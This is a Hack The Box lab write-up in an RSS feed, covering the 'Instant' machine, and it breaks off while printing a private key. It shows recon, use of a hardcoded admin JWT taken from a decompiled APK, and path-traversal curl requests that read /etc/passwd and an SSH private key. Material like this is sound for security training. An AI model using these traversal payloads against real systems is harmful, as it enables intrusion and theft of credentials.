<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>HTB on Ep1cac</title>
    <link>http://localhost:1313/tags/htb/</link>
    <description>Recent content in HTB on Ep1cac</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>Ep1cac</copyright>
    <lastBuildDate>Thu, 03 Apr 2025 13:48:40 -0500</lastBuildDate><atom:link href="http://localhost:1313/tags/htb/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
    
    
    <item>
      <title>Instant</title>
      <link>http://localhost:1313/posts/instant/</link>
      <pubDate>Thu, 03 Apr 2025 13:48:40 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/instant/</guid>
      <description><![CDATA[<p><img src="/img/instant/instant.png" alt="Instant"></p>
<h2 id="description">Description</h2>
<p>Instant is a medium-difficulty Linux box from Hack The Box. We discover a hardcoded JWT token and a couple of subdomains from a downloadable apk file, from which we exploit a path traversal vulnerability to read a ssh private key and gain a foothold. Credentials from the instant webapp db can then be used to decrypt a Solar-PuTTY session backup file to find the password for root.</p>
<h2 id="recon">Recon</h2>
<p>A TCP reveals SSH open on port 22 and a webapp on port 80.</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Thu Apr  3 10:22:19 2025 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.11.37
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/3%OT=22%CT=1%CU=33135%PV=Y%DS=2%DC=T%G=Y%TM=67EEA
OS:85B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=105%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%TS=
OS:A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53
OS:CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W
OS:1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%
OS:O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
OS:N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 18.676 days (since Sat Mar 15 18:12:18 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   39.80 ms 10.10.14.1
2   39.83 ms instant.htb (10.10.11.37)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  3 10:25:15 2025 -- 1 IP address (1 host up) scanned in 176.55 seconds
</code></pre><p>After adding <code>instant.htb</code> to <code>/etc/hosts</code>, we are brought to a website where we can download a money transfer app.</p>
<p><img src="/img/instant/instant_webpage.png" alt="Instant webapp"></p>
<p>The download link gives us an apk file. We can decompile it to enumerate for hardcoded secrets, insufficient validation, api calls, and other potential information that could lead us to an exploitable vulnerability.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant]
└─$ jadx --output-dir /tmp/instant/decompile /tmp/instant/instant.apk
</code></pre><p>Eventually, some actionable information is returned when searching for <code>instant.htb</code> in the decompiled apk, including two subdomains <code>mywalletv1.instant.htb</code> and <code>swagger-ui.instant.htb</code>, a username <code>support@instant.htb</code>, as well as a JWT authorization token in <code>AdminActivities.java</code>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ grep -ri &#34;instant.htb&#34; *
grep: resources/classes.dex: binary file matches
resources/res/layout/activity_forgot_password.xml:            android:text=&#34;Please contact support@instant.htb to have your account recovered&#34;
resources/res/xml/network_security_config.xml:        &lt;domain includeSubdomains=&#34;true&#34;&gt;mywalletv1.instant.htb
resources/res/xml/network_security_config.xml:        &lt;domain includeSubdomains=&#34;true&#34;&gt;swagger-ui.instant.htb
sources/com/instantlabs/instant/LoginActivity.java:        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/login&#34;).post(RequestBody.create(MediaType.parse(&#34;application/json&#34;), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.LoginActivity.4
sources/com/instantlabs/instant/AdminActivities.java:        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/view/profile&#34;).addHeader(&#34;Authorization&#34;, &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
sources/com/instantlabs/instant/TransactionActivity.java:        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/initiate/transaction&#34;).addHeader(&#34;Authorization&#34;, str4).post(RequestBody.create(MediaType.parse(&#34;application/json&#34;), jsonObject.toString())).build()).enqueue(new AnonymousClass2(str5, str4));
sources/com/instantlabs/instant/TransactionActivity.java:                        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/confirm/pin&#34;).header(&#34;Authorization&#34;, this.val$access_token).post(RequestBody.create(MediaType.parse(&#34;application/json&#34;), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.TransactionActivity.2.2
sources/com/instantlabs/instant/ProfileActivity.java:            new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/view/profile&#34;).addHeader(&#34;Authorization&#34;, accessToken).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.ProfileActivity.1
sources/com/instantlabs/instant/RegisterActivity.java:        new OkHttpClient().newCall(new Request.Builder().url(&#34;http://mywalletv1.instant.htb/api/v1/register&#34;).post(RequestBody.create(MediaType.parse(&#34;application/json&#34;), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.RegisterActivity.3
</code></pre><p>Looking at <code>AdminActivities.java</code>, we can see the JWT token is being used to make a call to <code>http://mywalletv1.instant.htb/api/v1/view/profile</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.instantlabs.instant;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.google.gson.JsonParser;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.google.gson.JsonSyntaxException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.Call;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.Callback;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.OkHttpClient;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.Request;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> okhttp3.Response;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* loaded from: classes.dex */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AdminActivities</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">TestAdminAuthorization</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> OkHttpClient().<span style="color:#a6e22e">newCall</span>(<span style="color:#66d9ef">new</span> Request.<span style="color:#a6e22e">Builder</span>().<span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#34;http://mywalletv1.instant.htb/api/v1/view/profile&#34;</span>).<span style="color:#a6e22e">addHeader</span>(<span style="color:#e6db74">&#34;Authorization&#34;</span>, <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;</span>).<span style="color:#a6e22e">build</span>()).<span style="color:#a6e22e">enqueue</span>(<span style="color:#66d9ef">new</span> Callback() { <span style="color:#75715e">// from class: com.instantlabs.instant.AdminActivities.1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#75715e">/* synthetic */</span> <span style="color:#66d9ef">boolean</span> $assertionsDisabled <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// okhttp3.Callback</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onFailure</span>(Call call, IOException iOException) {
</span></span><span style="display:flex;"><span>                System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Error Here : &#34;</span> <span style="color:#f92672">+</span> iOException.<span style="color:#a6e22e">getMessage</span>());
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// okhttp3.Callback</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onResponse</span>(Call call, Response response) <span style="color:#66d9ef">throws</span> IOException {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (response.<span style="color:#a6e22e">isSuccessful</span>()) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>                        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(JsonParser.<span style="color:#a6e22e">parseString</span>(response.<span style="color:#a6e22e">body</span>().<span style="color:#a6e22e">string</span>()).<span style="color:#a6e22e">getAsJsonObject</span>().<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;username&#34;</span>).<span style="color:#a6e22e">getAsString</span>());
</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">catch</span> (JsonSyntaxException e) {
</span></span><span style="display:flex;"><span>                        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Error Here : &#34;</span> <span style="color:#f92672">+</span> e.<span style="color:#a6e22e">getMessage</span>());
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Done&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can confirm the token is still valid.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/view/profile&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;     
{&#34;Profile&#34;:{&#34;account_status&#34;:&#34;active&#34;,&#34;email&#34;:&#34;admin@instant.htb&#34;,&#34;invite_token&#34;:&#34;instant_admin_inv&#34;,&#34;role&#34;:&#34;Admin&#34;,&#34;username&#34;:&#34;instantAdmin&#34;,&#34;wallet_balance&#34;:&#34;10000000&#34;,&#34;wallet_id&#34;:&#34;f0eca6e5-783a-471d-9d8f-0162cbc900db&#34;},&#34;Status&#34;:200}
</code></pre><h2 id="foothold">Foothold</h2>
<p>Recall that there is another subdomain that we found, <code>swagger-ui.instant.htb</code>. This subdomain contains documentation for the REST API endpoints on <code>mywalletv1.instant.htb</code>, from which we can get a clearer picture of the app&rsquo;s full range of funcitonality.</p>
<p><img src="/img/instant/swagger-ui.png" alt="Swagger ui"></p>
<p>There is an API endpoint <code>/api/v1/admin/view/logs</code> that lets us view available logs. Perhaps one of them has credentials we could use to escalate privileges.</p>
<p><img src="/img/instant/view_logs.png" alt="View logs api endpoint"></p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/view/logs&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;
{&#34;Files&#34;:[&#34;1.log&#34;],&#34;Path&#34;:&#34;/home/shirohige/logs/&#34;,&#34;Status&#34;:201}
</code></pre><p>The API returns a single log file <code>1.log</code> in <code>shirohige</code>&rsquo;s home directory. We can read it by passing in its filename as the argument for <code>log_file_name</code> to <code>/api/v1/admin/read/log</code>.</p>
<p><img src="/img/instant/read_log.png" alt="Read log api endpoint"></p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=1.log&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34;
{&#34;/home/shirohige/logs/1.log&#34;:[&#34;This is a sample log testing\n&#34;],&#34;Status&#34;:201}
</code></pre><p>Unfortunately the log itself reveals nothing of interest. But the fact that the filename is directly appended to the path <code>/home/shirohige/logs</code> in the response may indicate that the operation for file read also directly passes in user input, casuing a path traversal vulnerability. We can test this by sending a request to read <code>/etc/passwd</code>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../etc/passwd&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34; | jq .  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1673  100  1673    0     0  15447      0 --:--:-- --:--:-- --:--:-- 15490
{
  &#34;/home/shirohige/logs/../../../etc/passwd&#34;: [
    &#34;root:x:0:0:root:/root:/bin/bash\n&#34;,
    &#34;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n&#34;,
    &#34;bin:x:2:2:bin:/bin:/usr/sbin/nologin\n&#34;,
    &#34;sys:x:3:3:sys:/dev:/usr/sbin/nologin\n&#34;,
    &#34;sync:x:4:65534:sync:/bin:/bin/sync\n&#34;,
    &#34;games:x:5:60:games:/usr/games:/usr/sbin/nologin\n&#34;,
    &#34;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n&#34;,
    &#34;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n&#34;,
    &#34;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n&#34;,
    &#34;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n&#34;,
    &#34;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n&#34;,
    &#34;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n&#34;,
    &#34;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n&#34;,
    &#34;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n&#34;,
    &#34;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n&#34;,
    &#34;irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n&#34;,
    &#34;_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n&#34;,
    &#34;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n&#34;,
    &#34;systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n&#34;,
    &#34;systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n&#34;,
    &#34;dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n&#34;,
    &#34;messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n&#34;,
    &#34;systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n&#34;,
    &#34;pollinate:x:102:1::/var/cache/pollinate:/bin/false\n&#34;,
    &#34;polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n&#34;,
    &#34;usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n&#34;,
    &#34;sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n&#34;,
    &#34;shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n&#34;,
    &#34;_laurel:x:999:990::/var/log/laurel:/bin/false\n&#34;
  ],
  &#34;Status&#34;: 201
}
</code></pre><p>We successfully read the file, now we can enumerate the filesystem.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../proc/self/status&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34; | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1912  100  1912    0     0  10027      0 --:--:-- --:--:-- --:--:-- 10063
{
  &#34;/home/shirohige/logs/../../../proc/self/status&#34;: [
    &#34;Name:\tpython3\n&#34;,
    &#34;Umask:\t0022\n&#34;,
    &#34;State:\tS (sleeping)\n&#34;,
    &#34;Tgid:\t1334\n&#34;,
    &#34;Ngid:\t0\n&#34;,
    &#34;Pid:\t1334\n&#34;,
    &#34;PPid:\t1\n&#34;,
    &#34;TracerPid:\t0\n&#34;,
    &#34;Uid:\t1001\t1001\t1001\t1001\n&#34;,
    &#34;Gid:\t1002\t1002\t1002\t1002\n&#34;,
    &#34;FDSize:\t128\n&#34;,
    &#34;Groups:\t1001 1002 \n&#34;,
    &#34;NStgid:\t1334\n&#34;,
    &#34;NSpid:\t1334\n&#34;,
    &#34;NSpgid:\t1334\n&#34;,
    &#34;NSsid:\t1334\n&#34;,
    &#34;Kthread:\t0\n&#34;,
    &#34;VmPeak:\t  201928 kB\n&#34;,
    &#34;VmSize:\t  136408 kB\n&#34;,
    &#34;VmLck:\t       0 kB\n&#34;,
    &#34;VmPin:\t       0 kB\n&#34;,
    &#34;VmHWM:\t   54568 kB\n&#34;,
    &#34;VmRSS:\t   54568 kB\n&#34;,
    &#34;RssAnon:\t   40104 kB\n&#34;,
    &#34;RssFile:\t   14464 kB\n&#34;,
    &#34;RssShmem:\t       0 kB\n&#34;,
    &#34;VmData:\t   58720 kB\n&#34;,
    &#34;VmStk:\t     132 kB\n&#34;,
    &#34;VmExe:\t    2956 kB\n&#34;,
    &#34;VmLib:\t    9756 kB\n&#34;,
    &#34;VmPTE:\t     172 kB\n&#34;,
    &#34;VmSwap:\t       0 kB\n&#34;,
    &#34;HugetlbPages:\t       0 kB\n&#34;,
    &#34;CoreDumping:\t0\n&#34;,
    &#34;THP_enabled:\t1\n&#34;,
    &#34;untag_mask:\t0xffffffffffffffff\n&#34;,
    &#34;Threads:\t2\n&#34;,
    &#34;SigQ:\t0/7398\n&#34;,
    &#34;SigPnd:\t0000000000000000\n&#34;,
    &#34;ShdPnd:\t0000000000000000\n&#34;,
    &#34;SigBlk:\t0000000000000000\n&#34;,
    &#34;SigIgn:\t0000000001001000\n&#34;,
    &#34;SigCgt:\t0000000100000002\n&#34;,
    &#34;CapInh:\t0000000000000000\n&#34;,
    &#34;CapPrm:\t0000000000000000\n&#34;,
    &#34;CapEff:\t0000000000000000\n&#34;,
    &#34;CapBnd:\t000001ffffffffff\n&#34;,
    &#34;CapAmb:\t0000000000000000\n&#34;,
    &#34;NoNewPrivs:\t0\n&#34;,
    &#34;Seccomp:\t0\n&#34;,
    &#34;Seccomp_filters:\t0\n&#34;,
    &#34;Speculation_Store_Bypass:\tvulnerable\n&#34;,
    &#34;SpeculationIndirectBranch:\tconditional enabled\n&#34;,
    &#34;Cpus_allowed:\tffffffff,ffffffff,ffffffff,ffffffff\n&#34;,
    &#34;Cpus_allowed_list:\t0-127\n&#34;,
    &#34;Mems_allowed:\t00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001\n&#34;,                                                                                                                                  
    &#34;Mems_allowed_list:\t0\n&#34;,
    &#34;voluntary_ctxt_switches:\t53085\n&#34;,
    &#34;nonvoluntary_ctxt_switches:\t221\n&#34;,
    &#34;x86_Thread_features:\t\n&#34;,
    &#34;x86_Thread_features_locked:\t\n&#34;
  ],
  &#34;Status&#34;: 201
}
</code></pre><p>Reading <code>/proc/self/status</code>, we can see that our current Uid is 1001, meaning that we can verify that have the permissions of <code>shirohige</code> (<code>shirohige</code>&rsquo;s Uid is 1001 as seen from <code>/etc/passwd</code>). Further recon shows that <code>shirohige</code> as a private ssh key that we can read.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/instant/decompile]
└─$ curl &#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa&#34; -H &#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&#34; | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2809  100  2809    0     0  32082      0 --:--:-- --:--:-- --:--:-- 31920
{
  &#34;/home/shirohige/logs/../.ssh/id_rsa&#34;: [
    &#34;-----BEGIN OPENSSH PRIVATE KEY-----\n&#34;,
    &#34;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n&#34;,
    &#34;NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B\n&#34;,
    &#34;nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH\n&#34;,
    &#34;dAGhQuAAsDj8Avy1yQMZDV31PHcGEDu/0dU9jGmhjXfS70gfebpII3js9OmKXQAFc2T5k/\n&#34;,
    &#34;5xL+1MHnZBiQqKvjbphueqpy9gDadsiAvKtOA8I6hpDDLZalak9Rgi+BsFvBsnz244uCBY\n&#34;,
    &#34;8juWZrzme8TG5Np6KIg1tdZ1cqRL7lNVMgo7AdwQCVrUhBxKvTEJmIzR/4o+/w9njJ3+WF\n&#34;,
    &#34;uaMbBzOsNCAnXb1Mk0ak42gNLqcrYmupUepN1QuZPL7xAbDNYK2OCMxws3rFPHgjhbqWPS\n&#34;,
    &#34;jBlC7kaBZFqbUOA57SZPqJY9+F0jttWqxLxr5rtL15JNaG+rDfkRmmMzbGryCRiwPc//AF\n&#34;,
    &#34;Oq8vzE9XjiXZ2P/jJ/EXahuaL9A2Zf9YMLabUgGDAAAFiKxBZXusQWV7AAAAB3NzaC1yc2\n&#34;,
    &#34;EAAAGBAKW57ZWpZp2VnE1WdLJCDdvj6aq+MY2ICK2cmc3fWLSRrr/8NxlvAZ8ENb84dwQ8\n&#34;,
    &#34;sYS91iwN4z55GwfI+JbkaznxzYyvJRnnzjGLWP0+YRNFXh7+97hDgPwaHmh3QBoULgALA4\n&#34;,
    &#34;/AL8tckDGQ1d9Tx3BhA7v9HVPYxpoY130u9IH3m6SCN47PTpil0ABXNk+ZP+cS/tTB52QY\n&#34;,
    &#34;kKir426YbnqqcvYA2nbIgLyrTgPCOoaQwy2WpWpPUYIvgbBbwbJ89uOLggWPI7lma85nvE\n&#34;,
    &#34;xuTaeiiINbXWdXKkS+5TVTIKOwHcEAla1IQcSr0xCZiM0f+KPv8PZ4yd/lhbmjGwczrDQg\n&#34;,
    &#34;J129TJNGpONoDS6nK2JrqVHqTdULmTy+8QGwzWCtjgjMcLN6xTx4I4W6lj0owZQu5GgWRa\n&#34;,
    &#34;m1DgOe0mT6iWPfhdI7bVqsS8a+a7S9eSTWhvqw35EZpjM2xq8gkYsD3P/wBTqvL8xPV44l\n&#34;,
    &#34;2dj/4yfxF2obmi/QNmX/WDC2m1IBgwAAAAMBAAEAAAGARudITbq/S3aB+9icbtOx6D0XcN\n&#34;,
    &#34;SUkM/9noGckCcZZY/aqwr2a+xBTk5XzGsVCHwLGxa5NfnvGoBn3ynNqYkqkwzv+1vHzNCP\n&#34;,
    &#34;OEU9GoQAtmT8QtilFXHUEof+MIWsqDuv/pa3vF3mVORSUNJ9nmHStzLajShazs+1EKLGNy\n&#34;,
    &#34;nKtHxCW9zWdkQdhVOTrUGi2+VeILfQzSf0nq+f3HpGAMA4rESWkMeGsEFSSuYjp5oGviHb\n&#34;,
    &#34;T3rfZJ9w6Pj4TILFWV769TnyxWhUHcnXoTX90Tf+rAZgSNJm0I0fplb0dotXxpvWtjTe9y\n&#34;,
    &#34;1Vr6kD/aH2rqSHE1lbO6qBoAdiyycUAajZFbtHsvI5u2SqLvsJR5AhOkDZw2uO7XS0sE/0\n&#34;,
    &#34;cadJY1PEq0+Q7X7WeAqY+juyXDwVDKbA0PzIq66Ynnwmu0d2iQkLHdxh/Wa5pfuEyreDqA\n&#34;,
    &#34;wDjMz7oh0APgkznURGnF66jmdE7e9pSV1wiMpgsdJ3UIGm6d/cFwx8I4odzDh+1jRRAAAA\n&#34;,
